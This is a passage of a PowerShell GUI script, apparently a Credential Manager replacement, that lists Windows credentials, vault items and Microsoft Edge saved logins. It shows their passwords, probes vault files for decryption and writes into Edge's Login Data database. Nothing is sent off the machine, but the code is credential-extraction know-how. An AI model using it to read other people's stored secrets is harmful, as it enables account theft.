    $propForm.Controls.Add($lblUsername)

    $txtUsername = New-Object System.Windows.Forms.TextBox
    $txtUsername.Location = New-Object System.Drawing.Point(120, 87)
    $txtUsername.Size = New-Object System.Drawing.Size(275, 23)
    $txtUsername.Text = $SelectedObj.Username
    $propForm.Controls.Add($txtUsername)

    $lblPassword = New-Object System.Windows.Forms.Label
    $lblPassword.Text = 'Password:'
    $lblPassword.Location = New-Object System.Drawing.Point(15, 125)
    $lblPassword.AutoSize = $true
    $propForm.Controls.Add($lblPassword)

    $txtPassword = New-Object System.Windows.Forms.TextBox
    $txtPassword.Location = New-Object System.Drawing.Point(120, 122)
    $txtPassword.Size = New-Object System.Drawing.Size(275, 23)
    $txtPassword.UseSystemPasswordChar = $true
    $txtPassword.Text = $SelectedObj.Password
    $propForm.Controls.Add($txtPassword)

    $chkReveal = New-Object System.Windows.Forms.CheckBox
    $chkReveal.Text = 'Show password'
    $chkReveal.Location = New-Object System.Drawing.Point(120, 150)
    $chkReveal.AutoSize = $true
    $chkReveal.Add_CheckedChanged({ $txtPassword.UseSystemPasswordChar = -not $chkReveal.Checked })
    $propForm.Controls.Add($chkReveal)

    $lblNotice = New-Object System.Windows.Forms.Label
    $lblNotice.Text = 'Saving writes to the live Edge Login Data database and stores the password back as Chromium v10.'
    $lblNotice.Location = New-Object System.Drawing.Point(15, 175)
    $lblNotice.Size = New-Object System.Drawing.Size(390, 32)
    $lblNotice.ForeColor = [System.Drawing.Color]::DimGray
    $propForm.Controls.Add($lblNotice)

    $btnOk = New-Object System.Windows.Forms.Button
    $btnOk.Text = 'OK'
    $btnOk.Location = New-Object System.Drawing.Point(235, 205)
    $btnOk.Size = New-Object System.Drawing.Size(75, 25)
    $propForm.Controls.Add($btnOk)

    $btnCancel = New-Object System.Windows.Forms.Button
    $btnCancel.Text = 'Cancel'
    $btnCancel.Location = New-Object System.Drawing.Point(320, 205)
    $btnCancel.Size = New-Object System.Drawing.Size(75, 25)
    $propForm.Controls.Add($btnCancel)

    $btnOk.Add_Click({
        $propForm.Tag = [pscustomobject]@{
            Username = $txtUsername.Text
            Password = $txtPassword.Text
        }
        $propForm.DialogResult = [System.Windows.Forms.DialogResult]::OK
        $propForm.Close()
    })
    $btnCancel.Add_Click({ $propForm.Close() })

    $propForm.AcceptButton = $btnOk
    $propForm.CancelButton = $btnCancel

    if ($propForm.ShowDialog($MainForm) -eq [System.Windows.Forms.DialogResult]::OK) {
        return $propForm.Tag
    }

    return $null
}

# Sidebar Operations Matrix
$BtnAdd = New-Object System.Windows.Forms.Button; 
$BtnAdd.Text = "&Add..."; $BtnAdd.Location = New-Object System.Drawing.Point(430, 100); 
$BtnAdd.Size = New-Object System.Drawing.Size(100, 25); 
$MainForm.Controls.Add($BtnAdd)

$BtnRemove = New-Object System.Windows.Forms.Button; 
$BtnRemove.Text = "&Remove"; 
$BtnRemove.Location = New-Object System.Drawing.Point(430, 130); 
$BtnRemove.Size = New-Object System.Drawing.Size(100, 25); 
$BtnRemove.Enabled = $False; $MainForm.Controls.Add($BtnRemove)

$BtnEdit = New-Object System.Windows.Forms.Button; 
$BtnEdit.Text = "&Edit..."; 
$BtnEdit.Location = New-Object System.Drawing.Point(430, 160); 
$BtnEdit.Size = New-Object System.Drawing.Size(100, 25); 
$BtnEdit.Enabled = $False; $MainForm.Controls.Add($BtnEdit)

# Backup / Restore Panel Configuration
$GroupPanel = New-Object System.Windows.Forms.GroupBox
$GroupPanel.Text = "Back up or restore credentials"
$GroupPanel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Bold)
$GroupPanel.Location = New-Object System.Drawing.Point(12, 445)
$GroupPanel.Size = New-Object System.Drawing.Size(400, 100)
$MainForm.Controls.Add($GroupPanel)

$PanelSubLabel = New-Object System.Windows.Forms.Label
$PanelSubLabel.Text = "If you back up stored log-on credentials, you can restore them or transfer them to another computer."
$PanelSubLabel.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
$PanelSubLabel.Location = New-Object System.Drawing.Point(10, 20)
$PanelSubLabel.Size = New-Object System.Drawing.Size(380, 40)
$GroupPanel.Controls.Add($PanelSubLabel)

$BtnBackup = New-Object System.Windows.Forms.Button
$BtnBackup.Text = "&Back up..."
$BtnBackup.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
$BtnBackup.Location = New-Object System.Drawing.Point(10, 67)
$BtnBackup.Size = New-Object System.Drawing.Size(100, 25)
$GroupPanel.Controls.Add($BtnBackup)

$BtnRestore = New-Object System.Windows.Forms.Button
$BtnRestore.Text = "&Restore..."
$BtnRestore.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
$BtnRestore.Location = New-Object System.Drawing.Point(290, 67)
$BtnRestore.Size = New-Object System.Drawing.Size(100, 25)
$GroupPanel.Controls.Add($BtnRestore)

$BtnImportCrd = New-Object System.Windows.Forms.Button
$BtnImportCrd.Text = "&Import .crd"
$BtnImportCrd.Font = New-Object System.Drawing.Font("Segoe UI", 9, [System.Drawing.FontStyle]::Regular)
$BtnImportCrd.Location = New-Object System.Drawing.Point(430, 210)
$BtnImportCrd.Size = New-Object System.Drawing.Size(100, 25)
$BtnImportCrd.Visible = $false
$MainForm.Controls.Add($BtnImportCrd)

$BtnClose = New-Object System.Windows.Forms.Button
$BtnClose.Text = "Close"
$BtnClose.Location = New-Object System.Drawing.Point(430, 512)
$BtnClose.Size = New-Object System.Drawing.Size(100, 25)
$MainForm.Controls.Add($BtnClose)

$MainForm.AcceptButton = $BtnClose

$Global:WebCollection = New-Object System.Collections.Generic.List[System.Object]
$Global:WinCoreColl   = New-Object System.Collections.Generic.List[System.Object]
$Global:WinCertColl   = New-Object System.Collections.Generic.List[System.Object]
$Global:WinGenColl    = New-Object System.Collections.Generic.List[System.Object]

# -----
# 4. VAULT HELPER FUNCTIONS
# -------------------------------------------------------------
function Get-AllVaultGuids {
    $vaultGuids = @()

    try {
        $vaultOutput = & vaultcmd.exe /list 2>$null
        if ($vaultOutput) {
            foreach ($line in $vaultOutput) {
                if ($line -imatch '^\s*Vault Guid:\s*([A-F0-9\-]{36})\s*$') {
                    try {
                        $vaultGuids += [Guid]::Parse($matches[1])
                    } catch {
                        Write-Warning "Ignoring invalid vault GUID from vaultcmd.exe: $($matches[1])"
                    }
                }
            }
        }
    } catch {
        Write-Warning "Error parsing vaultcmd.exe vault list: $_"
    }

    if ($vaultGuids.Count -gt 0) {
        return @($vaultGuids | Select-Object -Unique)
    }

    # DllImport fallback for vault enumeration (optional, vaultcmd.exe is preferred)
    # Skipped due to P/Invoke complexity; rely on vaultcmd.exe first
    return @()
}

function Get-VaultFileDiagnostics {
    try {
        return @([VaultEncryptionEngine]::ProbeVaultFiles())
    } catch {
        Write-Warning "Error probing vault files: $_"
        return @()
    }
}

function Get-VaultCredentials {
    $vaultItems = @()

    try {
        $allVaults = Get-AllVaultGuids
        Write-TraceLog "Found $($allVaults.Count) vaults"

        foreach ($schemaGuid in $allVaults) {
            try {
                Write-TraceLog "Opening vault with GUID: $schemaGuid"
                $vaultMgr = New-Object VaultManager($schemaGuid)

                try {
                    $items = $vaultMgr.EnumerateItems()
                    Write-TraceLog "Vault $schemaGuid contains $($items.Count) items"

                    foreach ($item in $items) {
                        Write-TraceLog "  - Resource: $($item.Resource), Identity: $($item.Identity), FriendlyName: $($item.FriendlyName)"
                        $vaultItems += [PSCustomObject]@{
                            FriendlyName  = $item.FriendlyName
                            Resource      = $item.Resource
                            Identity      = $item.Identity
                            Authenticator = $item.Authenticator
                            SchemaId      = $item.SchemaId
                            RawObject     = $item
                        }
                    }
                } catch {
                    Write-Warning "Error calling EnumerateItems on vault $schemaGuid : $_"
                }

                $vaultMgr.Dispose()
            } catch {
                Write-Warning "Error creating VaultManager for $schemaGuid : $_"
            }
        }
    } catch {
        Write-Warning "Error in Get-VaultCredentials: $_"
    }

    # Try alternative approach - use CredEnumerate to find web credentials
    Write-TraceLog "Attempting alternative enumeration for web credentials..."
    try {
        $webFilters = @("MicrosoftAccount:*", "WindowsLive:*", "*")
        foreach ($filter in $webFilters) {
            try {
                Write-TraceLog "  Enumerating with filter: $filter"
                $creds = [Credential]::LoadAll()  # This uses CredEnumerate internally
                foreach ($cred in $creds) {
                    # Check if this looks like a web credential
                    if ($cred.Target -match "Snapshot|MicrosoftStore" -or $cred.Description -like "*web*") {
                        Write-TraceLog "    Found potential web credential: $($cred.Target)"
                        $vaultItems += [PSCustomObject]@{
                            FriendlyName  = $cred.Target
                            Resource      = $cred.Target
                            Identity      = $cred.Username
                            Authenticator = $cred.Password
                            SchemaId      = [Guid]::Empty
                            RawObject     = $cred
                        }
                    }
                }
            } catch {
                Write-Warning "Error with filter $filter : $_"
            }
        }
    } catch {
        Write-Warning "Error in alternative enumeration: $_"
    }

    Write-TraceLog "Total vault credentials found: $($vaultItems.Count)"
    return $vaultItems
}

function Show-VaultPropertyDialog ($SelectedObj) {
    $PropForm = New-Object System.Windows.Forms.Form
    $PropForm.Size = New-Object System.Drawing.Size(380, 310)
    $PropForm.StartPosition = "CenterParent"
    $PropForm.FormBorderStyle = "FixedDialog"
    $PropForm.MaximizeBox = $False
    $PropForm.MinimizeBox = $False
    $PropForm.Font = New-Object System.Drawing.Font("Segoe UI", 9)
    $PropForm.Text = if ($SelectedObj) { "Vault Item Properties" } else { "Add Vault Credential" }

    # Labels and textboxes
    $lblFriendly = New-Object System.Windows.Forms.Label; $lblFriendly.Text = "Friendly Name:"; $lblFriendly.Location = New-Object System.Drawing.Point(15,20); $lblFriendly.AutoSize = $True; $PropForm.Controls.Add($lblFriendly)
    $txtFriendly = New-Object System.Windows.Forms.TextBox; $txtFriendly.Location = New-Object System.Drawing.Point(145,17); $txtFriendly.Width = 190; $PropForm.Controls.Add($txtFriendly)

    $lblResource = New-Object System.Windows.Forms.Label; $lblResource.Text = "Resource:"; $lblResource.Location = New-Object System.Drawing.Point(15,50); $lblResource.AutoSize = $True; $PropForm.Controls.Add($lblResource)
    $txtResource = New-Object System.Windows.Forms.TextBox; $txtResource.Location = New-Object System.Drawing.Point(145,47); $txtResource.Width = 190; $PropForm.Controls.Add($txtResource)

    $lblIdentity = New-Object System.Windows.Forms.Label; $lblIdentity.Text = "Identity:"; $lblIdentity.Location = New-Object System.Drawing.Point(15,80); $lblIdentity.AutoSize = $True; $PropForm.Controls.Add($lblIdentity)
    $txtIdentity = New-Object System.Windows.Forms.TextBox; $txtIdentity.Location = New-Object System.Drawing.Point(145,77); $txtIdentity.Width = 190; $PropForm.Controls.Add($txtIdentity)

    $lblAuth = New-Object System.Windows.Forms.Label; $lblAuth.Text = "Authenticator (secret):"; $lblAuth.Location = New-Object System.Drawing.Point(15,110); $lblAuth.AutoSize = $True; $PropForm.Controls.Add($lblAuth)
    $txtAuth = New-Object System.Windows.Forms.TextBox; $txtAuth.Location = New-Object System.Drawing.Point(145,107); $txtAuth.Width = 190; $txtAuth.UseSystemPasswordChar = $True; $PropForm.Controls.Add($txtAuth)
    $chkShowSecret = New-Object System.Windows.Forms.CheckBox
    $chkShowSecret.Text = "Show secret"
    $chkShowSecret.Location = New-Object System.Drawing.Point(145,133)
    $chkShowSecret.AutoSize = $True
    $chkShowSecret.Add_CheckedChanged({ $txtAuth.UseSystemPasswordChar = -not $chkShowSecret.Checked })
    $PropForm.Controls.Add($chkShowSecret)

    if ($SelectedObj) {
        $txtFriendly.Text = $SelectedObj.FriendlyName
        $txtResource.Text = $SelectedObj.Resource
        $txtIdentity.Text = $SelectedObj.Identity
        $txtAuth.Text = $SelectedObj.Authenticator
    }

    $btnOK = New-Object System.Windows.Forms.Button; $btnOK.Text = "OK"; $btnOK.Location = New-Object System.Drawing.Point(180,230); $btnOK.Size = New-Object System.Drawing.Size(80,25); $PropForm.Controls.Add($btnOK)
    $btnCan = New-Object System.Windows.Forms.Button; $btnCan.Text = "Cancel"; $btnCan.Location = New-Object System.Drawing.Point(270,230); $btnCan.Size = New-Object System.Drawing.Size(80,25); $PropForm.Controls.Add($btnCan)

    $btnOK.Add_Click({
        if ([string]::IsNullOrWhiteSpace($txtFriendly.Text) -or [string]::IsNullOrWhiteSpace($txtResource.Text)) {
            [System.Windows.Forms.MessageBox]::Show("Friendly Name and Resource are required.")
            return
        }
        try {
            # Determine the correct vault GUID
            if ($SelectedObj) {
                # Use the item's own vault GUID (edit)
                $schemaGuid = $SelectedObj.SchemaId
            } else {
                # For a new item, pick the first available vault
                $availableVaults = Get-AllVaultGuids
                if ($availableVaults.Count -eq 0) {
                    [System.Windows.Forms.MessageBox]::Show("No vaults are available on this system. Cannot add credential.", "Vault Error")
                    return
                }
                $schemaGuid = $availableVaults[0]
            }

            $vaultMgr = New-Object VaultManager($schemaGuid)
            if ($SelectedObj) {
                # Update: delete old, create new
                $vaultMgr.DeleteItem($SelectedObj.RawObject)
                $vaultMgr.CreateItem($txtFriendly.Text, $txtResource.Text, $txtIdentity.Text, $txtAuth.Text, $schemaGuid)
            } else {
                $vaultMgr.CreateItem($txtFriendly.Text, $txtResource.Text, $txtIdentity.Text, $txtAuth.Text, $schemaGuid)
            }
            $vaultMgr.Dispose()
            $PropForm.DialogResult = [System.Windows.Forms.DialogResult]::OK
            $PropForm.Close()
        } catch {
            [System.Windows.Forms.MessageBox]::Show("Vault operation failed: " + $_.Exception.Message)
        }
    })

    $btnCan.Add_Click({ $PropForm.Close() })
    return $PropForm.ShowDialog($MainForm)
}

# -------------------------------------------------------------
# 5. ARCHITECTURAL DATA ROUTING DISPATCHER
# -------------------------------------------------------------
function Refresh-TabbedUI {
    $ListViewWeb.Items.Clear(); $Global:WebCollection.Clear()
    $LV_WinCore.Items.Clear();  $Global:WinCoreColl.Clear()
    $LV_WinCert.Items.Clear();  $Global:WinCertColl.Clear()
    $LV_WinGen.Items.Clear();   $Global:WinGenColl.Clear()
    if ($null -ne $LV_EdgeTab -and -not $LV_EdgeTab.IsDisposed) { $LV_EdgeTab.Items.Clear() }
    $Global:EdgeCollection = @()

    $webCreds = @(Get-WebCredentials)

    foreach ($w in $webCreds) {
        $Global:WebCollection.Add($w)
        $webTarget = if ($null -ne $w.Target) { [string]$w.Target } else { '' }
        $webUser = if ($null -ne $w.Username) { [string]$w.Username } else { '' }
        $lvItem = New-Object System.Windows.Forms.ListViewItem($webTarget)
        [void]$lvItem.SubItems.Add($webUser)
        [void]$ListViewWeb.Items.Add($lvItem)
    }

    try {
        # Engine now internally processes multi-filter array loops
        foreach ($r in [Credential]::LoadAll()) {
            $targetText = if ($null -ne $r.Target) { [string]$r.Target } else { '' }
            $userText = if ($null -ne $r.Username) { [string]$r.Username } else { '' }
            $lvItem = New-Object System.Windows.Forms.ListViewItem($targetText)
            [void]$lvItem.SubItems.Add($userText)

            switch ( [int]$r.Type ) {
                1 { $Global:WinGenColl.Add($r); [void]$LV_WinGen.Items.Add($lvItem) }
                3 { $Global:WinCertColl.Add($r); [void]$LV_WinCert.Items.Add($lvItem) }
                5 { $Global:WinCertColl.Add($r); [void]$LV_WinCert.Items.Add($lvItem) }
                default { $Global:WinCoreColl.Add($r); [void]$LV_WinCore.Items.Add($lvItem) }
            }
        }
    } catch {
        Write-Host "Error loading Windows credentials: $_"
    }

    try {
        $Global:EdgeCollection = @([EdgeDiagnosticsEngine]::LoadDiagnostics())
    } catch {
        $Global:EdgeCollection = @([pscustomobject]@{
            LoginId = 0
            ProfileName = '[Edge enumeration error]'
            ProfileDirectory = ''
            ProfilePath = ''
            Website = '-'
            ActionUrl = ''
            Username = '-'
            Password = $_.Exception.Message
            LastUsed = '-'
            EncryptionVersion = 'ERROR'
        })
    }
    $Global:EdgeDiagnosticRows = @($Global:EdgeCollection)
    Update-EdgeTabList

    # ===== DIAGNOSTICS: Clear all diagnostic list views =====
    $Global:DiagnosticListViews['WinCreds'].Items.Clear()
    $Global:DiagnosticListViews['PasswordVault'].Items.Clear()
    $Global:DiagnosticListViews['Edge'].Items.Clear()
    $Global:DiagnosticListViews['VaultDecrypt'].Items.Clear()
    $Global:DiagnosticListViews['Vaultcmd'].Items.Clear()
    $Global:DiagnosticListViews['ErrorLog'].Items.Clear()

    # --- Section 1: Windows Credential Manager (cmdkey.exe / DPAPI) ---
    try {
        $cmdkeyCreds = Get-CmdkeyCredentials
        $loadedTargets = @()

        # Collect all loaded credential targets
        foreach ($c in ([Credential]::LoadAll())) {
            $loadedTargets += $c.Target
        }

        # Display each cmdkey credential with status
        foreach ($cred in $cmdkeyCreds) {
            $found = $loadedTargets -contains $cred.Target
            $status = if ($found) { "OK" } else { "MISSING" }
            $statusColor = if ($found) { [System.Drawing.Color]::Green } else { [System.Drawing.Color]::Red }

            $lvItem = New-Object System.Windows.Forms.ListViewItem("cmdkey.exe")
            $lvItem.ForeColor = [System.Drawing.Color]::Black
            [void]$lvItem.SubItems.Add($cred.Target)
            [void]$lvItem.SubItems.Add($cred.User)
            [void]$lvItem.SubItems.Add($cred.Type)
            [void]$lvItem.SubItems.Add($status)
            $Global:DiagnosticListViews['WinCreds'].Items.Add($lvItem)
        }

        if ($cmdkeyCreds.Count -eq 0) {
            $lvItem = New-Object System.Windows.Forms.ListViewItem("cmdkey.exe")
            $lvItem.ForeColor = [System.Drawing.Color]::Gray
            [void]$lvItem.SubItems.Add("[No credentials found]")
            [void]$lvItem.SubItems.Add("-")
            [void]$lvItem.SubItems.Add("-")
            [void]$lvItem.SubItems.Add("INFO")
            $Global:DiagnosticListViews['WinCreds'].Items.Add($lvItem)
        }
    } catch {
        $lvItem = New-Object System.Windows.Forms.ListViewItem("cmdkey.exe")
        $lvItem.ForeColor = [System.Drawing.Color]::Red
        [void]$lvItem.SubItems.Add("[ERROR]")
        [void]$lvItem.SubItems.Add("-")
        [void]$lvItem.SubItems.Add("-")
        [void]$lvItem.SubItems.Add("ERROR")
        $Global:DiagnosticListViews['WinCreds'].Items.Add($lvItem)
        Add-DiagnosticErrorLogEntry -Source "cmdkey.exe" -Message $_
    }

    # --- Section 2: PasswordVault API (WinRT / System.Windows.Security) ---
    try {
        if ($webCreds.Count -gt 0) {
            # Group by resource
            $byResource = $webCreds | Group-Object -Property Target
            foreach ($resourceGroup in $byResource) {
                $lvItem = New-Object System.Windows.Forms.ListViewItem("PasswordVault")
                $lvItem.ForeColor = [System.Drawing.Color]::DarkBlue
                [void]$lvItem.SubItems.Add($resourceGroup.Name)
                [void]$lvItem.SubItems.Add($resourceGroup.Group[0].Username)
                [void]$lvItem.SubItems.Add($resourceGroup.Count)
                [void]$lvItem.SubItems.Add("OK")
                $Global:DiagnosticListViews['PasswordVault'].Items.Add($lvItem)
            }
        } else {
            $lvItem = New-Object System.Windows.Forms.ListViewItem("PasswordVault")
            $lvItem.ForeColor = [System.Drawing.Color]::Gray
            [void]$lvItem.SubItems.Add("[No web credentials found]")
            [void]$lvItem.SubItems.Add("-")
            [void]$lvItem.SubItems.Add("0")
            [void]$lvItem.SubItems.Add("INFO")
            $Global:DiagnosticListViews['PasswordVault'].Items.Add($lvItem)
        }
    } catch {
        $lvItem = New-Object System.Windows.Forms.ListViewItem("PasswordVault")
        $lvItem.ForeColor = [System.Drawing.Color]::Red
        [void]$lvItem.SubItems.Add("[ERROR]")
        [void]$lvItem.SubItems.Add("-")
        [void]$lvItem.SubItems.Add("0")
        [void]$lvItem.SubItems.Add("ERROR")
        $Global:DiagnosticListViews['PasswordVault'].Items.Add($lvItem)
        Add-DiagnosticErrorLogEntry -Source "PasswordVault API" -Message $_
    }

    # --- Section 3: Microsoft Edge (Chromium Login Data) ---
    try {
        Update-EdgeDiagnosticsList

        foreach ($cred in $Global:EdgeDiagnosticRows) {
            if ($cred.EncryptionVersion -eq 'ERROR') {
                Add-DiagnosticErrorLogEntry -Source 'Edge Login Data' -Message ($cred.ProfileDirectory + ': ' + $cred.Password)
            }
        }
    } catch {
        $Global:EdgeDiagnosticRows = @()
        $lvItem = New-Object System.Windows.Forms.ListViewItem('[Edge enumeration error]')
        $lvItem.ForeColor = [System.Drawing.Color]::Red
        [void]$lvItem.SubItems.Add('-')
        [void]$lvItem.SubItems.Add('-')
        [void]$lvItem.SubItems.Add('-')
        [void]$lvItem.SubItems.Add('-')
        [void]$lvItem.SubItems.Add('ERROR')
        $Global:DiagnosticListViews['Edge'].Items.Add($lvItem)
        Add-DiagnosticErrorLogEntry -Source 'Edge Login Data' -Message $_
    }

    # --- Section 4: Direct Vault Decryption (Policy.vpol / .vcrd) ---
    # NOTE: This section now attempts BOTH undocumented vault enumeration and a safe file-based
    # probe of Policy.vpol / .vcrd data. Exact HRESULTs from vault enumeration are logged when available.
    try {
        $allVaults = Get-AllVaultGuids
        $fileProbeByGuid = @{}
        foreach ($probe in (Get-VaultFileDiagnostics)) {
            if ($probe -and $probe.VaultGuid) {
                $fileProbeByGuid[$probe.VaultGuid.ToUpperInvariant()] = $probe
            }
        }

        if ($allVaults.Count -gt 0) {
            foreach ($vaultGuid in $allVaults) {
                try {
                    $vaultMgr = New-Object VaultManager($vaultGuid)
                    $items = $null
                    $enumerationSummary = $null
                    try {
                        $items = $vaultMgr.EnumerateItems()
                        $enumerationSummary = $vaultMgr.GetLastEnumerationSummary()
                    } catch [System.EntryPointNotFoundException] {
                        $items = @()
                        $enumerationSummary = $vaultMgr.GetLastEnumerationSummary()
                    } catch {
                        $items = @()
                        $enumerationSummary = $_.Exception.Message
                    }
                    $vaultMgr.Dispose()

                    $itemCount = if ($items) { $items.Count } else { 0 }
                    $probeKey = $vaultGuid.ToString().ToUpperInvariant()
                    $fileProbe = if ($fileProbeByGuid.ContainsKey($probeKey)) { $fileProbeByGuid[$probeKey] } else { $null }
                    $lvItem = New-Object System.Windows.Forms.ListViewItem("Vault Files")

                    if ($itemCount -gt 0) {
                        $lvItem.ForeColor = [System.Drawing.Color]::DarkGreen
                        $status = "ENUM-OK"
                        $detailText = $enumerationSummary
                    } elseif ($fileProbe -and $fileProbe.DecryptedCredentialCount -gt 0) {
                        $lvItem.ForeColor = [System.Drawing.Color]::DarkGreen
                        $status = "FILE-OK"
                        $detailText = $fileProbe.Detail
                    } else {
                        $lvItem.ForeColor = [System.Drawing.Color]::Blue
                        $status = if ($fileProbe) { $fileProbe.Status } else { "API-LIMITED" }
                        $detailText = if ($fileProbe -and $fileProbe.Detail) {
                            $fileProbe.Detail
                        } else {
                            $enumerationSummary
                        }
                    }

                    $displayCount = if ($fileProbe) {
                        [Math]::Max($itemCount, $fileProbe.DecryptedCredentialCount)
                    } else {
                        $itemCount
                    }

                    [void]$lvItem.SubItems.Add($vaultGuid.ToString())
                    [void]$lvItem.SubItems.Add($detailText)
                    [void]$lvItem.SubItems.Add($displayCount.ToString())
                    [void]$lvItem.SubItems.Add($status)
                    $Global:DiagnosticListViews['VaultDecrypt'].Items.Add($lvItem)

                    if ($enumerationSummary) {
                        Add-DiagnosticErrorLogEntry -Source "Vault Enumeration" -Message ("Vault {0}: {1}" -f $vaultGuid, $enumerationSummary)
                    }
                    if ($fileProbe -and $fileProbe.Detail) {
                        Add-DiagnosticErrorLogEntry -Source "Vault Files" -Message ("Vault {0}: {1} - {2}" -f $vaultGuid, $fileProbe.Status, $fileProbe.Detail)
                    }
                } catch {
                    $lvItem = New-Object System.Windows.Forms.ListViewItem("Vault Files")
                    $lvItem.ForeColor = [System.Drawing.Color]::Red
                    [void]$lvItem.SubItems.Add($vaultGuid.ToString())
                    [void]$lvItem.SubItems.Add("[Vault Error]")
                    [void]$lvItem.SubItems.Add("0")
                    [void]$lvItem.SubItems.Add("ERROR")
                    $Global:DiagnosticListViews['VaultDecrypt'].Items.Add($lvItem)
                    $vaultGuidText = if ($null -ne $vaultGuid) { $vaultGuid.ToString() } else { "[null]" }
                    $vaultIdShort = if ($vaultGuidText.Length -ge 8) { $vaultGuidText.Substring(0,8) } else { $vaultGuidText }
                    $errorMsg = $_.Exception.Message
                    if ($errorMsg -match "VaultEnumerateItemsNext") {
                        $errorMsg = "VaultEnumerateItemsNext not available on this system (use Section 4: vaultcmd.exe for credentials)"
                    }
                    Add-DiagnosticErrorLogEntry -Source "Vault Decryption" -Message ("Vault {0}: {1}" -f $vaultIdShort, $errorMsg)
                }
            }
        } else {
            $lvItem = New-Object System.Windows.Forms.ListViewItem("Vault Files")
            $lvItem.ForeColor = [System.Drawing.Color]::Gray
            [void]$lvItem.SubItems.Add("[No vaults found]")
            [void]$lvItem.SubItems.Add("-")
            [void]$lvItem.SubItems.Add("0")
            [void]$lvItem.SubItems.Add("INFO")
            $Global:DiagnosticListViews['VaultDecrypt'].Items.Add($lvItem)
        }
    } catch {
        $lvItem = New-Object System.Windows.Forms.ListViewItem("Vault Files")
        $lvItem.ForeColor = [System.Drawing.Color]::Red
        [void]$lvItem.SubItems.Add("[Enumeration Error]")
        [void]$lvItem.SubItems.Add("-")
        [void]$lvItem.SubItems.Add("0")
        [void]$lvItem.SubItems.Add("ERROR")
        $Global:DiagnosticListViews['VaultDecrypt'].Items.Add($lvItem)
        Add-DiagnosticErrorLogEntry -Source "Vault Enumeration" -Message $_
    }

    # --- Section 5: vaultcmd.exe CLI Reference ---
    try {
        $vaultcmdCreds = Get-VaultcmdCredentials

        if ($vaultcmdCreds.Count -gt 0) {
            # Display each credential individually, not grouped
            foreach ($cred in $vaultcmdCreds) {
                $lvItem = New-Object System.Windows.Forms.ListViewItem("vaultcmd.exe")
                $lvItem.ForeColor = [System.Drawing.Color]::DarkMagenta
                [void]$lvItem.SubItems.Add($cred.VaultName)
                [void]$lvItem.SubItems.Add($cred.Target)
                [void]$lvItem.SubItems.Add($cred.Username)
                [void]$lvItem.SubItems.Add("CLI-ONLY")
                $Global:DiagnosticListViews['Vaultcmd'].Items.Add($lvItem)
            }
        } else {
            $lvItem = New-Object System.Windows.Forms.ListViewItem("vaultcmd.exe")
            $lvItem.ForeColor = [System.Drawing.Color]::Gray
            [void]$lvItem.SubItems.Add("[No system-protected credentials]")
            [void]$lvItem.SubItems.Add("-")
            [void]$lvItem.SubItems.Add("-")
            [void]$lvItem.SubItems.Add("INFO")
            $Global:DiagnosticListViews['Vaultcmd'].Items.Add($lvItem)
        }
    } catch {
        $lvItem = New-Object System.Windows.Forms.ListViewItem("vaultcmd.exe")
        $lvItem.ForeColor = [System.Drawing.Color]::Red
        [void]$lvItem.SubItems.Add("[Lookup Error]")
        [void]$lvItem.SubItems.Add("-")
        [void]$lvItem.SubItems.Add("-")
        [void]$lvItem.SubItems.Add("ERROR")
        $Global:DiagnosticListViews['Vaultcmd'].Items.Add($lvItem)
        Add-DiagnosticErrorLogEntry -Source "vaultcmd.exe" -Message $_
    }

    # ===================================================================

    Update-ButtonStates
}

$Global:LastFocusedGrid = $ListViewWeb

function Invoke-UiEventSafely {
    param(
        [scriptblock]$Action
    )

    try {
        if ($null -ne $MainForm -and $MainForm.IsDisposed) {
            return
        }

        & $Action
    } catch [System.Management.Automation.PipelineStoppedException] {
        return
    } catch [System.ObjectDisposedException] {
        return
    } catch {
        try {
            if ($Global:DiagnosticListViews -and $Global:DiagnosticListViews.ContainsKey('ErrorLog')) {
                $errorList = $Global:DiagnosticListViews['ErrorLog']
                if ($null -ne $errorList -and -not $errorList.IsDisposed) {
                    Add-DiagnosticErrorLogEntry -Source 'UI Event' -Message $_
                }
            }
        } catch {}
    }
}

function Update-ButtonStates {
    if ($null -eq $TabControl -or $TabControl.IsDisposed) { return }
    if ($null -eq $BtnAdd -or $BtnAdd.IsDisposed) { return }
    if ($null -eq $BtnEdit -or $BtnEdit.IsDisposed) { return }
    if ($null -eq $BtnRemove -or $BtnRemove.IsDisposed) { return }
    if ($null -ne $BtnImportCrd -and -not $BtnImportCrd.IsDisposed) {
        $BtnImportCrd.Visible = ($TabControl.SelectedIndex -eq 3)
    }

    if ($TabControl.SelectedIndex -eq 2) {
        $BtnAdd.Enabled = $false
        $edgeSelected = ($Global:LastFocusedGrid -eq $LV_EdgeTab) -and ($null -ne (Get-SelectedEdgeTabRow))
        $BtnEdit.Enabled = $edgeSelected
        $BtnRemove.Enabled = $edgeSelected
        return
    }

    if ($TabControl.SelectedIndex -eq 3) {
        $BtnAdd.Enabled = $false
        $edgeSelected = ($Global:LastFocusedGrid -eq $LV_EdgeDiagnostics) -and ($null -ne (Get-SelectedEdgeDiagnosticRow))
        $BtnEdit.Enabled = $edgeSelected
        $BtnRemove.Enabled = $edgeSelected
        return
    }

    $BtnAdd.Enabled = $true

    if ($TabControl.SelectedIndex -eq 0) { $Global:LastFocusedGrid = $ListViewWeb }
    if ($TabControl.SelectedIndex -eq 2) { $Global:LastFocusedGrid = $LV_EdgeTab }
    if ($null -eq $Global:LastFocusedGrid -or $Global:LastFocusedGrid.IsDisposed) {
        $Global:LastFocusedGrid = $ListViewWeb
    }

    $selected = $Global:LastFocusedGrid.SelectedIndices.Count -gt 0
    $BtnEdit.Enabled = $selected; $BtnRemove.Enabled = $selected
}

function Clear-OtherSelections($ActiveGrid) {
    if ($null -eq $ActiveGrid -or $ActiveGrid.IsDisposed) { return }

    $Global:LastFocusedGrid = $ActiveGrid
    $grids = @($LV_WinCore, $LV_WinCert, $LV_WinGen)
    foreach ($g in $grids) {
        if ($null -ne $g -and -not $g.IsDisposed -and $g -ne $ActiveGrid) {
            $g.SelectedIndices.Clear()
        }
    }

    Update-ButtonStates
}

$ListViewWeb.Add_SelectedIndexChanged({ Invoke-UiEventSafely { Update-ButtonStates } })
$LV_WinCore.Add_SelectedIndexChanged({ Invoke-UiEventSafely { if ($LV_WinCore.SelectedIndices.Count -gt 0) { Clear-OtherSelections $LV_WinCore } } })
